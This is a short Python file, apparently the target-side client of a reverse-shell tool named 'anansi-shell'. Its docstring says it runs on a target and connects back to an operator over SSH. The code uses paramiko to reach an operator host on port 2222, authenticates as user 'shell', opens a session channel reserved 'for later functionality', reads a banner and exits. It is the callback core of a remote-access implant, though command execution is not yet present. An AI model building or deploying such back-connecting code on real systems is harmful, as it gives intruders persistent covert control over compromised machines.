"""Target, connects back to the operator over SSH."""

import argparse

import paramiko


def connect(host, port, password, fingerprint=None):
    """Open session channel for later functionality."""
    transport = paramiko.Transport((host, port))
    transport.start_client()
    server_key = transport.get_remote_server_key()
    if fingerprint and server_key.fingerprint != fingerprint:
        transport.close()
        raise SystemExit(f"host key mismatch: saw {server_key.fingerprint}")
    try:
        transport.auth_password("shell", password)
    except paramiko.AuthenticationException:
        transport.close()
        raise SystemExit("authentication failed")
    return transport, transport.open_session()


def main():
    parser = argparse.ArgumentParser(description="anansi-shell client")
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=2222)
    parser.add_argument("--password", required=True)
    parser.add_argument("--fingerprint", help="expected host key SHA256 fingerprint")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()
    transport, channel = connect(args.host, args.port, args.password, args.fingerprint)
    banner = channel.recv(4096)
    if args.verbose:
        print(f"banner: {banner.decode(errors='replace')!r}", flush=True)
    channel.close()
    transport.close()


if __name__ == "__main__":
    main()
